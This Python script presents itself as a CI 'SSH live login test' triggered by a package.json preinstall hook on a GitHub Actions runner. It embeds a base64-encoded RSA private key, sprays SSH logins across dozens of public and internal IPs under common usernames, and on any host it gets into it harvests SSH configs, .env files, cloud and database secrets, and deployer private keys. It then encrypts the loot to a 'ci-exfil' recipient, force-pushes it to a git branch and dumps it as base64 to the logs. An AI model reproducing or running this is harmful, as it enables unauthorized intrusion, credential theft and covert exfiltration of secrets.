#!/usr/bin/env python3
# Intent 28154: SSH live login test with KeyPair-b3d4-1110.pem (roger drive, RSA-3072 live key)
# Runs inside a GitHub Actions runner (clean egress) via package.json "preinstall" hook.
import os, sys, json, time, base64, subprocess, socket, threading, shutil, hashlib, traceback

REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in REF:
    print("results-branch-skip", flush=True); sys.exit(0)

RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = int(os.environ.get("PROBE_BUDGET", "1150"))

OUT = "/tmp/results"
for d in ("ssh", "misc"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

KEYPEM_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KTUlJRzVBSUJBQUtDQVlFQTU1YjZaMWNzOWVtc2R6cElTM2hMSG5Na1ZVaU9vbmloWmxHSkFGV1NqMy9nc1p4bA0KWDl0MXNYS0ZyOHFuNk9ld21BR1RaeXV2aG5Uc0VOTE4ySU1JaHlHcSttZWpWNkh3UnNIRGZtZmhFZ2V2QlB6ag0KMlJmUnZQbHVYYWQzREpqWkhXeTZiQnRsbVlLazVsR2dFZ0Erc2hzTWkvcWhBdTBSMWIwa3dON2Y5Qmx0RW1xKw0KRDZ5Q1grR2w0czZZZ2NUVXFNWW9KUVlpOCtjSytUQVpWQkdFK2h1SGlDZU5na0hveDBhd2hud2FWWG8wMEp4Rg0KdHBET1VERVdNemYwMHBzdG80T3NCSStSMnVsMHpKY3Nham5ZRG5LMHRLS1dUazkraFBTUjM4R1Q2amJuWFpZUg0KOUJYTWZNQzJrdFB5QUJlQmRLZ2oxYmUxMUhqTDA0cjF6M3JMdmhERVBtUlFJakp4WHF6eVpFdVI3L2NjQUc1OA0KYzY3N01xYm80NWxlaGpEajJ1NGxBcTJhUUQxZWRXTUtZU1F0U2M5ZWcrOE5WVjgxbFN2eXdnTmlkVG9xcE9xTQ0KeUZsdWZ1ZVRUUHcvUFdtN2Q5QU45aDgwLzVlZ0ZoMjJ0OFVRSytBMXlEQkJ4MnpSUVFWaDVGc0tpd3ZiMDI4cA0KNEk4dnZ3VTVwb2JpdUw4VEFnTUJBQUVDZ2dHQVRTdGorVGQxUmVROWtlVWIzZm9SbmUza04zN2IrSXVWekpCeQ0KeEdlL1ZJM2FBNVVIdXE5WVFtN1UyVVVBT24ycHZKMFp6eEVoaGY1RUF6OGJWSUFsUVZJWXRTUC9xOTNNUU9law0KQ3VUMmZKbU8ybXlpUjk3R0J1QmV4RnBmTXhWams0aDlmalNLNEdKR0xIRWFrNlQ5UDBBQUtFeTFobElVMVZJWA0KZ3lWQkh3ZXg3cWNlK2Y0VDIzdEhXWkphQXpQaFlQUFd3SytReWhFOCtOZnNPTFUxeUZtUUNmQ1VHTWw1bFoyYQ0KaU5XbHVNSG1BM1Z2VFd4bk14V0lQanp4R1pTWE9EZWlYcndxUTBFWWRqT3J4Y2pzd1Zja25FR1lWVk02T2pBeA0KS2JDbHN2U3hHZi9Hcmw4NUNUeWlrKzRSRlo4STBxY2s3bmNXYkwyUno0bTdXb1BSdmZYa1BzTnVDV0xHWHp2TQ0KVmhuRVdhUGcxTVl3UjdpMDhGOWNITXVzQ29zMnFiYnJ6STRqeWp0a1FISUZoa2pyWWh4SytwZzN4dGh4K2RVbw0KdU4veVZMRzYwV2tRQUF0TTRna3ZPYzlUTzdaTmdlNkxnMDBCQUhIRk1kRFRTa3VISlk1WnNYSUNqRWNidXBjTw0KSjd1b2swUURBMHNKait2S0Jnck9SVVlSWUt5aEFvSEJBUHp4dzNCeExaRk1WMUNSdkllMllPYVdnQ2FjaXpjYg0KeWNjVnBoVkJLZGMzbnE4YVN6bVJET0JsUWdDUEVqSDlPaFYvMXpyMWo2akhDZHJ0L0xTT1I0eU9VZ1VWVFlQeA0KSlVoT01IZ2hQTmRwTXFVVDY1dnJ5aUhEZEFlQXNSRXBEdFpQWFIrb1dVNGs1NnNlUnRPcDYvYjVtVEpNUDRUSQ0KVHR2NHVkKzQrYi9pSlMyL0dNVUhsT3hHMUhoWWZMOW1jcitBaCsxUFVzSEpHTFNaQWkwcVh3R3F6OHlRYjR6eg0KWDV6bGxYb3VOVmZyWVBMQXkySC93bmJlMXczQTIrVHpxd0tCd1FEcVl5ek0zNm5uVnBoR3JuUjhpcHdtUGw4ag0KZkVWN2RhUEFLZHd0ZzM0cjZrQ3p1WmdBRHdORXl1cTB1ZWJScERuazcrVUJCdUZvVFB1b1AzQmtiMUNwdmVDMg0KMXNYaWxyd24rY0tJaFhXVEg4SjZEaVVjeGlsVy9KV1FjTktGa1gwNlNxUWRoSGJYbktTeXMrc3g5dzhMYkpzRA0KVm53a1lXK3FJb1hJekRZL0ZhMDZLcEcwalMzajNZWkV5NzdNbFcyZXh5djdpVEZDUUpoRU5pQjRoSzd5eENTQQ0KbkNQdW9mVWFVNXFoaUNZZlR3UUtqZEVoaVdEdG1CMXVsMkxkZWprQ2djRUFsWEZCUnUyWFBvRWNGVDRGWlNrYg0KbHlEVUZmdm5SR2ZtanZqN1p4Tlk1UTYzY2p6V3RPdzk3MVhqNlBDZWoycE5KdWFoQXZTU0srVnNyU3h1WVQ2dQ0KaHh5TzJQSDlHamNmRDlraVNkZFpXdXVNUUh2RWVCcVhFZHVvY2NaVzF3eXE5M05zVVlmbE80WVNXY2RKa1VTVA0KWlJlU3EyVGhJbEkyUlVCdWtQOTRqeVhOVVhuVjZKTFNLY2F2UVdzR1NRNytQS1p6cUlGMUk0anNUOGNXd2hpRw0KaVRXaUQvcEY3Y0RjZkpZbitrZlN2RjhVcUZlLzBlYUp2akZxWFhYVWRUQ0JBb0hBU2JFbXU3OHlqdzUxei9zMw0KbXBTRjVheEVnMGFtSGR2dHdSUW9LcE1tRHk2V2F5dFY4K2JFYzFPTkdZYzlYL3BQVFlCek1yQjBIRFBnQjVUeQ0KaEZGUFBoNzUwT0tUMHRycmkzSUdUS0FSU0ZGNjlwOE40ZzhYbmtiSnkyRDlmNHN2b1Mwb2pqTkFuaWVjekthdQ0Kc3NYbmtBTDBkY2N5UHNuM3Jya3Q4T1RyeFVmT2IvUkVYVXpwK2JPRGJJdldrRUlHOWgzTzRVWFFHL0Z0TGowSw0KVm5uNCsxRFozU202VG1QVFNSU3lFRWxiR3dyZnpXV3JNKzBhY1hrYS85Tk8vUzFaQW9IQkFJalRrbVUzbWpRaw0KWFhPS2ZQaEpDL2E1OENKcllSTWZXNlpBdlpZUzVHWmpOa1FWbVpkUEdoaC9wV3hkNllnaXNLK0JzQVY5SzhQZQ0KVzJyZGRka1kyL3pZbFhsSjl3c0lsY2pnQU5MbzlhakJJbmVic2pVMmFuOHc4RTN0WFp1NlVNSUtHTC8weDkvdA0KTmpMTWpsT0ludTNQL3dyUXBwM1dHallmaDdzclVtczJDZjRqbDRLNVluNC9CMi8yWGpnMkpQYkVCTG5uQVZ4Qw0KTmg3YkIyTUdqOStIQTA2UEtNbDJVcG5vY0cya2p3dEVqUVBHQXZ5RU96a25iamdtdnJkb3JBPT0NCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tDQo="
KEYDIR = "/tmp/keys"
os.makedirs(KEYDIR, exist_ok=True)
KEY = os.path.join(KEYDIR, "kp_b3d4.pem")
raw = base64.b64decode(KEYPEM_B64).replace(b"\r\n", b"\n")
open(KEY, "wb").write(raw)
os.chmod(KEY, 0o600)

# ---------- push results ----------
RESULT_BRANCH = os.environ.get("RESULT_BRANCH", "ci-ssh-28154-results")
def push_results(final=False):
    enc = "/tmp/results.tar.gz.gpg"
    tarball = "/tmp/results.tar.gz"
    try:
        subprocess.run("tar czf %s -C /tmp results" % tarball, shell=True, check=False)
        tsize = os.path.getsize(tarball) if os.path.isfile(tarball) else 0
        log("TARBALL size", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s" % (enc, tarball),
                           shell=True, capture_output=True, text=True, timeout=180)
        else:
            shutil.copy(tarball, enc)
        if os.path.isfile(enc):
            esz = os.path.getsize(enc); data = open(enc, "rb").read()
            log("ENC size", esz, "sha256", hashlib.sha256(data).hexdigest())
            shutil.copy(enc, "results.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f results.tar.gz.gpg && git commit -m 'ci ssh results %s %s'||true" % (RUNID, "final" if final else "partial"),
                           shell=True, capture_output=True)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH,
                               shell=True, capture_output=True, text=True, timeout=240)
            log("PUSH rc=%s out=%s err=%s" % (r.returncode, (r.stdout or "")[-200:], (r.stderr or "")[-300:]))
            if final and len(data) <= 3 * 1024 * 1024:
                b64 = base64.b64encode(data).decode()
                log("B64BEGIN %d" % len(b64))
                for i in range(0, len(b64), 3500):
                    print("B64:" + b64[i:i+3500], flush=True)
                print("B64END", flush=True)
    except Exception as e:
        log("PUSH EXC", repr(e))

def tcp(host, port, timeout=6):
    t = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout); s.close()
        return "OPEN %.1fs" % (time.time() - t)
    except Exception as e:
        return "ERR " + repr(e)[:80]

HOSTS = [
    ("122.51.1.87", 22), ("111.229.52.43", 22), ("43.142.238.91", 22), ("124.223.170.146", 22),
    ("18.142.48.45", 22), ("81.69.230.90", 22), ("13.214.183.170", 22), ("101.32.60.77", 22),
    ("47.98.12.30", 22), ("81.68.254.22", 22), ("43.143.107.214", 22), ("1.14.34.31", 22),
    ("132.232.141.32", 22), ("13.213.43.208", 22), ("54.169.172.218", 22), ("18.136.197.33", 22),
    ("13.213.49.132", 22), ("13.250.132.81", 22), ("18.139.111.137", 22), ("18.143.63.130", 22),
    ("54.169.82.91", 22), ("139.155.94.165", 22), ("49.235.41.58", 22), ("129.28.59.242", 22),
    ("101.34.207.178", 22), ("1.15.151.149", 22), ("1.15.133.230", 22), ("124.221.49.45", 22),
    ("129.211.0.26", 22), ("54.67.97.25", 22), ("43.142.238.91", 2222),
    # internal (probably unreachable from runner, keeps negative boundary precise)
    ("10.20.1.5", 22), ("10.20.1.6", 22), ("10.20.1.7", 22), ("10.20.3.9", 22), ("10.30.0.8", 22),
]
USERS = ["ubuntu", "root", "coder", "lumii", "centos", "deploy", "admin", "ec2-user", "user1", "roger", "lumi"]

summary = {"target": "ssh28154", "ts": int(time.time()), "ports": {}, "ssh": {}, "keyfp": None}
lock = threading.Lock()

def ssh_attempt(host, port, user):
    base = ("ssh -i %s -p %d -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            "-o LogLevel=ERROR -o ConnectTimeout=7 -o PreferredAuthentications=publickey -o PasswordAuthentication=no "
            "-o NumberOfPasswordPrompts=0 -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa "
            "-o IdentitiesOnly=yes") % (KEY, port)
    cmd = base + " %s@%s 'echo LOGIN_OK; id; hostname; whoami; uname -a; sudo -n id 2>&1 | head -2'" % (user, host)
    t = time.time()
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=25)
        return {"user": user, "rc": r.returncode, "out": (r.stdout or "")[:2000], "err": (r.stderr or "")[:800], "t": round(time.time()-t, 1)}
    except Exception as e:
        return {"user": user, "rc": -99, "out": "", "err": "TIMEOUT/EXC " + repr(e)[:200], "t": round(time.time()-t, 1)}

def gather(host, port, user):
    safe = ("%s_%d_%s" % (host, port, user)).replace(".", "_")
    cmds = [
        "cat /etc/hostname; id; hostname; uname -a; sudo -n id 2>&1 | head -2",
        "ls -la /root 2>/dev/null | head -40; echo ---HOME---; ls -la ~ | head -60",
        "ls -la ~/.ssh 2>/dev/null; echo ---CFG---; cat ~/.ssh/config 2>/dev/null | head -80; echo ---AUTHK---; cat ~/.ssh/authorized_keys 2>/dev/null | head -10",
        "cat /etc/os-release 2>/dev/null | head -6; echo ---; ls /opt /data /srv 2>/dev/null",
        "find / -maxdepth 4 -name '.env' 2>/dev/null | head -60",
        "grep -rIlaiE 'zoofi|zoofi-index|DEPLOYER_PRIVATE_KEY|Auth for zoofi|0xFE18|0xC56f' /opt /data /srv /root /home /etc 2>/dev/null | head -30",
        "cat /etc/ssh/sshd_config 2>/dev/null | grep -iE 'PasswordAuth|PubkeyAuth|PermitRoot|Port'",
        "lastlog 2>/dev/null | head -20; echo ---; w 2>/dev/null; echo ---; ss -lntp 2>/dev/null | head -40",
        "docker ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -40",
        "env | grep -iE 'DATABASE|DSN|POSTGRES|REDIS|AWS_|TENCENT|SECRET|TOKEN|PRIVATE' | head -40",
        "grep -rIlsE 'postgres://|postgresql://' /opt /data /srv /root /home /etc 2>/dev/null | head -20",
    ]
    logf = open(os.path.join(OUT, "ssh", "gather_%s.log" % safe), "w")
    for c in cmds:
        if time.time() - START > BUDGET:
            logf.write("### BUDGET-ABORT\n"); break
        cmd = ("ssh -i %s -p %d -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
               "-o LogLevel=ERROR -o ConnectTimeout=8 -o PreferredAuthentications=publickey -o PubkeyAcceptedAlgorithms=+ssh-rsa "
               "-o IdentitiesOnly=yes %s@%s %s") % (KEY, port, user, host, "'" + c + "'")
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            logf.write("### CMD: %s\n%s\n---STDERR---\n%s\n\n" % (c, r.stdout, (r.stderr or "")[:400]))
            logf.flush()
        except Exception as e:
            logf.write("### CMD EXC %s: %r\n" % (c, e)); logf.flush()
    logf.close()

def main():
    log("START intent 28154 run", RUNID, "ref", REF)
    # key fingerprint
    try:
        r = subprocess.run("ssh-keygen -y -f %s" % KEY, shell=True, capture_output=True, text=True, timeout=20)
        pub = r.stdout.strip()
        open(os.path.join(OUT, "misc", "key.pub"), "w").write(pub + "\n")
        rf = subprocess.run("ssh-keygen -lf %s.pub" % KEY, shell=True, capture_output=True, text=True, timeout=20) if os.path.isfile(KEY + ".pub") else None
        log("PUBKEY", pub[:160], "| stderr", (r.stderr or "")[:200])
        if pub:
            open(KEY + ".pub", "w").write(pub + "\n")
            rf = subprocess.run("ssh-keygen -lf %s.pub" % KEY, shell=True, capture_output=True, text=True, timeout=20)
            summary["keyfp"] = (rf.stdout or "").strip()
            log("KEYFP", summary["keyfp"])
    except Exception as e:
        log("keygen err", repr(e))

    # ---------- TCP reachability ----------
    uniq = list(dict.fromkeys(HOSTS))
    q = list(uniq)
    def tworker():
        while True:
            with lock:
                if not q: return
                hp = q.pop(0)
            h, p = hp
            res = tcp(h, p)
            with lock:
                summary["ports"]["%s:%d" % (h, p)] = res
    ths = [threading.Thread(target=tworker) for _ in range(12)]
    for t in ths: t.start()
    for t in ths: t.join()
    log("PORTS", json.dumps(summary["ports"]))
    json.dump(summary, open(os.path.join(OUT, "summary.json"), "w"), ensure_ascii=False, indent=1)
    push_results(final=False)

    # ---------- SSH attempts ----------
    reach = [(h, p) for (h, p) in uniq if str(summary["ports"].get("%s:%d" % (h, p)) or "").startswith("OPEN")]
    log("REACHABLE:", reach)
    jobs = [(h, p, u) for (h, p) in reach for u in USERS]
    results = {}
    jq = list(jobs)
    def worker():
        while True:
            with lock:
                if not jq: return
                h, p, u = jq.pop(0)
            if time.time() - START > BUDGET - 240: return
            r = ssh_attempt(h, p, u)
            key = "%s:%d/%s" % (h, p, u)
            with lock:
                results[key] = r
            if r["rc"] == 0 and "LOGIN_OK" in r["out"]:
                log("*** LOGIN SUCCESS", key, r["out"][:300])
    ths = [threading.Thread(target=worker) for _ in range(10)]
    for t in ths: t.start()
    for t in ths: t.join()
    summary["ssh"] = results
    json.dump(summary, open(os.path.join(OUT, "summary.json"), "w"), ensure_ascii=False, indent=1)
    for k, v in results.items():
        tail = (v.get("err") or "").strip().splitlines()
        log("SSH", k, "rc", v["rc"], "|", (tail[-1] if tail else (v.get("out") or "").strip()[:80])[:150])
    push_results(final=False)

    # ---------- deep gather on successful logins ----------
    for k, v in results.items():
        if v["rc"] == 0 and "LOGIN_OK" in v["out"]:
            h, pu = k.split("/")[0].split(":"); h = h; p = int(pu); u = k.split("/")[1]
            log("GATHER", h, p, u)
            gather(h, p, u)
    push_results(final=True)
    log("DONE")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("FATAL", traceback.format_exc())
        try: push_results(final=True)
        except Exception: pass
